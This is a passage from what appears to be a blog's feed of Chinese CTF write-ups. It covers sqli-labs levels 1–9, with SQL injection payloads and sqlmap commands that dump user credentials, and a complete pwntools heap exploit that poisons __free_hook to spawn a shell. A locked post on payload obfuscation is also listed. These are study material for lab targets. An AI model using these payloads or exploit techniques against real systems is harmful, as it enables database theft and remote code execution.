class="line-numbers-rows"><span></span></span></code></pre><p>爆表，库中有表 emails, referers, uagents, users</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">-1'UNION SELECT 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>爆users表的字段</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">-1'UNION SELECT 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/SNIPER_FILE/ba80e76bac98f19e3e11052afe732797_MD5.jpeg"></p><p>爆 username 和 password 列的数据</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">-1'UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '&lt;br>') from users--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/SNIPER_FILE/6ef05546d1710f6aea02326ac0b8ddd5_MD5.jpeg"></p><h1 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h1><p>还是GET传参，id?&#x3D;1</p><p><code>1&#39;</code>单引号报错<br><img src="/SNIPER_FILE/629cd3175a7a2ec059bf1ff3b1fdb4ec_MD5.jpeg"></p><p><code>1&#39;--+</code>还是报错，看来是字符型<br><img src="/SNIPER_FILE/7abe3f752d68c1e9e4ac58549624bae9_MD5.jpeg"></p><p>然后跟level1一样了，把单引号去了就行<br><img src="/SNIPER_FILE/bb3bb333377d3af4f7dfec592006b912_MD5.jpeg"></p><h1 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h1><p>单引号报错，注释后面的也报错，是字符型，但是这里的报错要注意</p><p><img src="/SNIPER_FILE/e5d773c3740dbff66a88890c15ec3dfe_MD5.jpeg"></p><p>所以我们需要将括号闭合</p><p>爆列数：</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">id=-1') union select 1,2,3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/SNIPER_FILE/44635ec4a33ed787d8cfb0ae2adb3657_MD5.jpeg"></p><p>然后就是跟前面一样<br><img src="/SNIPER_FILE/114819b199c72e6933feb74b5553bc17_MD5.jpeg"></p><h1 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h1><p>单引号没反应，双引号报错了，双引号的字符型<br><img src="/SNIPER_FILE/964a833c2c6d791c5ea5cba77438acdd_MD5.jpeg"></p><p>注意括号闭合，跟level3一样<br><img src="/SNIPER_FILE/7ab66e7d9a58913596eb76f7d2ed6b15_MD5.jpeg"></p><p>爆库</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">-1") union select 1,2,database()--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>爆字段</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">-1") UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '&lt;br>') from users--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h1><p>id&#x3D;1，回显了一个 “You are in”<br><img src="/SNIPER_FILE/2056d2fe10bbf187f0108da429847a99_MD5.jpeg"></p><p>单引号报错<br><img src="/SNIPER_FILE/54ae93969a70a1a642189e336a6dda0d_MD5.jpeg"></p><p>是字符型<br><img src="/SNIPER_FILE/e680cadad695f0424ad2531e6153ce7d_MD5.jpeg"></p><p>爆列数，是三列：</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">id=1' union select 1,2,3--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/SNIPER_FILE/7df21af07b6ff5f2b32d87c9deab9bda_MD5.jpeg"></p><p>只有“You are in”来判断是否成功，bool盲注</p><ul><li>爆库：<br>先测库名长度，最终测出来8位时有回显<pre class="line-numbers language-text" data-language="text"><code class="language-text">1' and length(database())=8 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/SNIPER_FILE/6b32306fa6ddf4c723ff7668c75ce814_MD5.jpeg"></li></ul><p>然后测库名，先测第一个字符，测出为 ‘s’</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">1' and ascii(substr(database(),1,1))=115 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/SNIPER_FILE/74e9368bbfcd6de2da35d01d3260ec3e_MD5.jpeg"></p><p>测出了注入点，sqlmap直接梭即可</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python sqlmap.py <span class="token parameter variable">-u</span> http://7796490a-d8c6-4484-a4f4-93f46c2e3466.node5.buuoj.cn/Less-5?id<span class="token operator">=</span><span class="token number">1</span> <span class="token parameter variable">-p</span> <span class="token string">'id'</span> <span class="token parameter variable">--technique</span> B --current-db <span class="token parameter variable">--batch</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/SNIPER_FILE/f334bf44aa25e575e5f5b197c8c300f0_MD5.jpeg"></p><ul><li><p>爆表</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python sqlmap.py <span class="token parameter variable">-u</span> http://7796490a-d8c6-4484-a4f4-93f46c2e3466.node5.buuoj.cn/Less-5?id<span class="token operator">=</span><span class="token number">1</span> <span class="token parameter variable">-p</span> <span class="token string">'id'</span> <span class="token parameter variable">--technique</span> B <span class="token parameter variable">-D</span> <span class="token string">'security'</span> <span class="token parameter variable">--tables</span> <span class="token parameter variable">--batch</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/SNIPER_FILE/6f2eaf7b5b20201ebae3d8f20a5c967c_MD5.jpeg"></p></li><li><p>爆字段</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python sqlmap.py <span class="token parameter variable">-u</span> http://7796490a-d8c6-4484-a4f4-93f46c2e3466.node5.buuoj.cn/Less-5?id<span class="token operator">=</span><span class="token number">1</span> <span class="token parameter variable">-p</span> <span class="token string">'id'</span> <span class="token parameter variable">--technique</span> B <span class="token parameter variable">-D</span> <span class="token string">'security'</span> <span class="token parameter variable">-T</span> <span class="token string">'users'</span> <span class="token parameter variable">--columns</span> <span class="token parameter variable">--batch</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/SNIPER_FILE/fe88ba57b2cac20d91ecbb8bdf3207db_MD5.jpeg"></p></li><li><p>爆数据</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python sqlmap.py <span class="token parameter variable">-u</span> http://7796490a-d8c6-4484-a4f4-93f46c2e3466.node5.buuoj.cn/Less-5?id<span class="token operator">=</span><span class="token number">1</span> <span class="token parameter variable">-p</span> <span class="token string">'id'</span> <span class="token parameter variable">--technique</span> B <span class="token parameter variable">-D</span> <span class="token string">'security'</span> <span class="token parameter variable">-T</span> <span class="token string">'users'</span> <span class="token parameter variable">-C</span> <span class="token string">'username,password'</span> <span class="token parameter variable">--dump</span> <span class="token parameter variable">--batch</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><h1 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h1><p>还是GET参数</p><p><code>1&#39;</code>单引号无反应，<code>1&quot;</code>双引号报错<br><img src="/SNIPER_FILE/a074dbb60681daab2c70772ff8eaafc6_MD5.jpeg"></p><p><code>1&quot;--+</code>不报错，看来是字符型</p><p>那就跟level5一样，只是把单引号换成双引号罢了</p><h1 id="level-7"><a href="#level-7" class="headerlink" title="*level 7"></a>*level 7</h1><p><code>?id=1</code>，这次输出不一样了<br><img src="/SNIPER_FILE/822b5a2aad57c06891092c9e3f8a2a38_MD5.jpeg"></p><p><code>1&#39;</code>单引号不再回显详细的错误信息，只提示语法有错误<br><img src="/SNIPER_FILE/fdf3fa4bcdc79579bfb20d03e3137d27_MD5.jpeg"></p><p><code>1&#39; --+</code> 还是报错</p><p><code>1&#39;&#39;</code>不报错了，id 应该是由单引号包裹的<br><img src="/SNIPER_FILE/dcc8577f74b559276161d9bd16cea6a6_MD5.jpeg"></p><p><code>1&#39;)--+</code>加个括号，还是报错</p><p><code>1&#39;))--+</code>双括号，不报错了！看来id是 <code>((&#39;id&#39;))</code> 包裹的<br><img src="/SNIPER_FILE/6db41c0f6345366db261c7c7573ae260_MD5.jpeg"></p><ul><li><p>测试注入点，成功正常返回，说明有3列</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">1')) union select 1,2,3--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/SNIPER_FILE/0a2c9f79dbf0531a0fa3eb68c54a6608_MD5.jpeg"></p></li><li><p>爆库<br>测试库名长度</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">1')) and length(database())=8--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><p>后面的就跟level5一样了</p><h1 id="level-8"><a href="#level-8" class="headerlink" title="level 8"></a>level 8</h1><p>GET传参?id&#x3D;1<br><img src="/SNIPER_FILE/6ca284ff4431e10c997b860c7911a800_MD5.jpeg"></p><p><code>1&#39;</code>加个单引号，没回显了<br><img src="/SNIPER_FILE/840d6751977e36851724df91dcd1452c_MD5.jpeg"></p><p><code>1&#39; --+</code>回显成功<br><img src="/SNIPER_FILE/2a592df9d1d5da0d38ac10a95bcd3f8d_MD5.jpeg"></p><p>测试注入点，有三列</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">1' union select 1,2,3--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>后面的就跟level5一样了</p><h1 id="level-9"><a href="#level-9" class="headerlink" title="level 9"></a>level 9</h1><p>GET传参</p><p><code>1&#39;</code>单引号，没反应<br><code>1&quot;</code>双引号，没反应</p><p>可能是时间盲注，测一下</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">1' and if(1=2,1,sleep(5)) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/SNIPER_FILE/ecba818f8ec4f46dbe4d85156950cce2_MD5.jpeg"><br>成功延迟</p><ul><li>爆库<br>测试库名称长度，长度为8时不延迟<pre class="line-numbers language-text" data-language="text"><code class="language-text">1' and if(length(database())=8,1,sleep(5)) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><p>测试库名的第一个字符，115即’s’时不延迟</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">1' and if(ascii(substr(database(),1,1))=115,1,sleep(5)) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后就直接上sqlmap了，爆库名：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python sqlmap.py <span class="token parameter variable">-u</span> <span class="token string">'http://8014c573-16a1-446b-b671-54736ab76628.node5.buuoj.cn/Less-9?id=1'</span> <span class="token parameter variable">-p</span> <span class="token string">'id'</span> <span class="token parameter variable">--technique</span> T <span class="token parameter variable">-o</span> --current-db <span class="token parameter variable">--batch</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/SNIPER_FILE/d64997bbe7f46dadc52e3a26e14fff24_MD5.jpeg"></p><p>然后正常爆库爆表爆字段即可</p>]]></content>
      
      
      <categories>
          
          <category> pentest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>21.Payload Obfuscation - IPv4 IPv6Fuscation 有效负载混淆-IPV4 IPV6</title>
      <link href="/2024/12/25/21.Payload%20Obfuscation%20-%20IPv4%20IPv6Fuscation%20%E6%9C%89%E6%95%88%E8%B4%9F%E8%BD%BD%E6%B7%B7%E6%B7%86-IPV4%20IPV6/"/>
      <url>/2024/12/25/21.Payload%20Obfuscation%20-%20IPv4%20IPv6Fuscation%20%E6%9C%89%E6%95%88%E8%B4%9F%E8%BD%BD%E6%B7%B7%E6%B7%86-IPV4%20IPV6/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="e340392a392c987bce0ac7b37c4e875c7dfa36691dd570d3a2af0984fb87a304"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 逆向工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AV </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024-12第三周2：normalbabynote</title>
      <link href="/2024/12/21/2024-12%E7%AC%AC%E4%B8%89%E5%91%A82%EF%BC%9Anormalbabynote/"/>
      <url>/2024/12/21/2024-12%E7%AC%AC%E4%B8%89%E5%91%A82%EF%BC%9Anormalbabynote/</url>
      
        <content type="html"><![CDATA[<h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><p><img src="/EXP_FILE/d5c87a68584104cabfaaf21deaa0da54_MD5.jpeg"></p><p>给了libc</p><h1 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h1><p>经典堆菜单<br><img src="/EXP_FILE/5e07d5e722b024c622f9b44e9068d1ed_MD5.jpeg"></p><p>重点关注add和edit</p><ul><li><p>add<br><img src="/EXP_FILE/7679fe6f39f3ad75f624ef66b509446e_MD5.jpeg"><br>申请的chunk&lt;0x2f0，并且末尾置0，测试没有off by null</p></li><li><p>edit<br><img src="/EXP_FILE/cfc7a4630c83ace46c815090c3a96c3a_MD5.jpeg"></p></li></ul><p>这里用abs取绝对值，但是没有对我们的输入作出限制，那么就可以整数溢出，当输入一个 0x80000000（-2147483648） 时，由于正数最大为 2147483647 ，所以会转换失败而返回负值</p><p>也就是说我们有一个负向溢出写</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>可以负向溢出写，tcache 打 __free_hook</p><p>但是该如何泄露libc？</p><ul><li>思路1、填满tcache进到unsortedbin。但是题目只能申请16次，填满tcache都得占掉14次，不可行</li><li>思路2、利用负向溢出写，能改掉自己的size构造unsortedbin chunk，通过堆重叠泄露libc<br><img src="/EXP_FILE/9c2b258746c85e7ff0a9edb2695eb9d4_MD5.jpeg"></li></ul><h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment">#@Author:X1NRI</span><span class="token keyword">import</span> sys<span class="token keyword">import</span> os<span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> ctypes <span class="token keyword">import</span><span class="token operator">*</span><span class="token comment">#from LibcSearcher import LibcSearcher</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#dbg(None)</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span class="token operator">!=</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span>gdbscript<span class="token operator">=</span>command<span class="token punctuation">)</span><span class="token comment">#pause()</span><span class="token comment">#------------------------------------------------------------------</span><span class="token keyword">def</span> <span class="token function">menu</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>sla<span class="token punctuation">(</span><span class="token string">'> '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>menu<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">'size> '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">'msg> '</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>offset<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>menu<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">'idx> '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">'offset> '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>offset<span class="token punctuation">)</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">'msg> '</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>menu<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">'idx> '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>menu<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">'idx> '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>add<span class="token punctuation">(</span><span class="token number">0x1f0</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token comment">#0</span>add<span class="token punctuation">(</span><span class="token number">0x1f0</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token comment">#1</span>add<span class="token punctuation">(</span><span class="token number">0x1f0</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token comment">#2</span>add<span class="token punctuation">(</span><span class="token number">0x1f0</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token comment">#3</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">2147483648</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token operator">*</span><span class="token number">0x38</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x601</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#0</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x1f0</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token comment">#4</span>show<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>leak<span class="token operator">=</span>u64<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address<span class="token operator">=</span>leak<span class="token operator">-</span><span class="token number">0x3ebca0</span>lg<span class="token punctuation">(</span><span class="token string">'libc'</span><span class="token punctuation">,</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span>free_hook<span class="token operator">=</span>ls<span class="token punctuation">(</span><span class="token string">'__free_hook'</span><span class="token punctuation">)</span>system<span class="token operator">=</span>ls<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x1f0</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token comment">#5</span>add<span class="token punctuation">(</span><span class="token number">0x1f0</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token comment">#6</span>delete<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x1f0</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token comment">#7</span>add<span class="token punctuation">(</span><span class="token number">0x1f0</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#8</span>edit<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>dbg<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span>itr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>bits<span class="token operator">=</span><span class="token number">64</span><span class="token punctuation">,</span>endian<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"tmux"</span><span class="token punctuation">,</span><span class="token string">"splitw"</span><span class="token punctuation">,</span><span class="token string">"-h"</span><span class="token punctuation">,</span><span class="token string">"-l 150"</span><span class="token punctuation">]</span>binary<span class="token operator">=</span><span class="token string">'./pwn'</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>libc<span class="token operator">=</span>elf<span class="token punctuation">.</span>libc<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>s  <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sl   <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sa   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>sla  <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>r    <span class="token operator">=</span> <span class="token keyword">lambda</span> num      <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token operator">=</span>num<span class="token punctuation">)</span>ru   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>DROP<span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>data<span class="token punctuation">,</span>drop<span class="token operator">=</span>DROP<span class="token punctuation">)</span>rl  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>ep   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span>data<span class="token punctuation">]</span>eg   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span>data<span class="token punctuation">]</span>es   <span class="token operator">=</span> <span class="token keyword">lambda</span> data       <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>ls   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>itr  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>ic   <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>pt   <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m %s --- %s \033[0m'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>s<span class="token punctuation">,</span><span class="token builtin">type</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lg   <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m&#123;&#125; ==> &#123;:#x&#125;\033[0m'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>pwn<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTFpwn </category>
          
      </categories>
      
      
        <tags>
            
